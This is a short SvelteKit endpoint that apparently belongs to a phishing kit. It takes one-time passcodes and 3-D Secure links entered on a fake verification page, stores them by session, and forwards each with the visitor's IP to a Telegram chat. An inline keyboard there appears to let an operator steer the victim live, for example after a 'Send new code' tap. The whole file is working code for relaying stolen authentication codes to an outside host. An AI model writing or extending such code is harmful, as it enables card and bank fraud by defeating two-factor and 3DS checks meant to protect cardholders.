import { sendTelegram, buildKeyboard } from '$lib/telegram.js';
import { saveData, pushHistory } from '$lib/sessions.js';
import { inc } from '$lib/stats.js';
import { json } from '@sveltejs/kit';

/**
 * Send OTP / 3DS submissions to Telegram with the right inline keyboard.
 * Body: { type: 'otp'|'3ds', sessionId, value, attempt }
 *
 * @type {import('./$types').RequestHandler}
 */
export async function POST({ request, url, getClientAddress, platform }) {
  const { type, sessionId, value, attempt } = await request.json().catch(() => ({}));

  if (!sessionId || !type) return json({ ok: false }, { status: 400 });

  const ip = getClientAddress();
  const date = new Date().toISOString();
  const baseUrl = `${url.protocol}//${url.host}`;

  let message = '';
  let keyboard;

  if (type === 'otp') {
    await saveData(platform, sessionId, { lastOtp: value });
    await pushHistory(platform, sessionId, 'otps', value);
    await inc(platform, 'otps');
    message =
`🔑 *OTP Code*

⏰ ${date}
🌍 IP: \`${ip}\`

🔢 Code: \`${value}\`
🔄 Attempt: ${attempt ?? 1}
🔑 Session: \`${sessionId}\``;
    keyboard = buildKeyboard(sessionId, baseUrl, 'otp');
  } else if (type === '3ds') {
    await saveData(platform, sessionId, { lastLink: value });
    await pushHistory(platform, sessionId, 'links', value);
    await inc(platform, 'links3ds');
    message =
`🔗 *3D Secure Link*

⏰ ${date}
🌍 IP: \`${ip}\`

🔗 Link: \`${value}\`
🔄 Attempt: ${attempt ?? 1}
🔑 Session: \`${sessionId}\``;
    keyboard = buildKeyboard(sessionId, baseUrl, '3ds');
  } else if (type === 'resend') {
    message =
`🔁 *Resend Requested*

⏰ ${date}
🌍 IP: \`${ip}\`

The user tapped *"Send new code"* on the OTP page.
🔑 Session: \`${sessionId}\``;
    keyboard = buildKeyboard(sessionId, baseUrl, 'otp');
  } else {
    return json({ ok: false }, { status: 400 });
  }

  await sendTelegram(message, keyboard);
  return json({ ok: true });
}
